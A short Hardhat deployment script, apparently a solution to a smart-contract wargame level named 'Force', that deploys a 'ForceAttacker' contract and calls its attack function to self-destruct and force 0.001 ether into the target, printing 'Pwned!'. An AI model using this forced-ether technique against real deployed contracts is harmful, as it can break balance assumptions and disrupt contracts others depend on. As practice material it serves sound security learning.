const { deployments, ethers } = require("hardhat")

async function main() {
  /* Get signer */

  const accounts = await ethers.getSigners()
  const deployer = accounts[0]

  /* Attack deploying a new attacker contract */

  console.log("Deploying attacker contract...")
  await deployments.fixture("force")
  const attacker = await ethers.getContract("ForceAttacker", deployer)

  /* Running the attack */

  console.log("Self-destructing the attacker contract to send funds to Force...")
  await attacker.attack({ value: ethers.utils.parseEther("0.001") })
  console.log("Pwned!")
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
